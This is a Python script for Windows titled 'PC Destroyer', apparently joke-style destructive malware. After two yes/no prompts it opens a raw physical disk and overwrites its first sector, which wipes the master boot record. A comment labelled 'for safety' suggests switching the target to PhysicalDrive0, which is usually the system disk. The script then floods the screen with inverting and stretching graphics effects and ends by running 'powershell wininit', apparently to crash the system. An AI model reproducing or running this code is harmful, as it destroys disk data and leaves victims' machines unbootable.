from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import win32file
import ctypes
import sys
from random import *
import time
import os
 
desk = GetDC(0)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
w = GetSystemMetrics(0)
h = GetSystemMetrics(1)
sw = GetSystemMetrics(0)
sh = GetSystemMetrics(1)
a = GetSystemMetrics(SM_CXSCREEN)
b = GetSystemMetrics(SM_CYSCREEN)
if MessageBox("Hello, Are You Jeff Bezos", "PC Destroyer", MB_ICONQUESTION | MB_YESNO) ==7:
        exit()
if MessageBox("Are You Sure", "PC Destroyer", MB_ICONQUESTION | MB_YESNO) ==7:
        exit()
#change to PhysicalDrive0(for safety)
hDevice = CreateFileW('////.//PhysicalDrive1', GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)
hwnd = GetDesktopWindow()

# Get the device context (DC) for the entire screen
hdc2 = GetWindowDC(hwnd)

# Get the screen width and height
x2 = GetSystemMetrics(0)
y2 = GetSystemMetrics(1)

def tunnel_effect():
        hwnd = GetDesktopWindow()

        # Get the device context (DC) for the entire screen
        hdc2 = GetWindowDC(hwnd)

        # Get the screen width and height
        x2 = GetSystemMetrics(0)
        y2 = GetSystemMetrics(1)
        for i in range(0, 50):
                StretchBlt(hdc2, 25, 25, x2 - 50, y2 - 50, hdc2, 0, 0, x2, y2, SRCCOPY)
                time.sleep(0.4)
def main():
  hdc = GetDC(0)
  x = GetSystemMetrics(0)
  y = GetSystemMetrics(1)
  w = x
  h = y
  BitBlt(hdc, 10, 10, w, h, hdc, 12, 12, SRCCOPY)
for i in range(100):
	brush = CreateSolidBrush(RGB(
		0,
		255,
		0,
        ))
	PatBlt(desk, 0, 0, x, y, PATINVERT)
	PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
	BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
	StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
 
	StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCINVERT)
	main()
	DeleteObject(brush)
	Sleep(0)

os.system("powershell wininit")
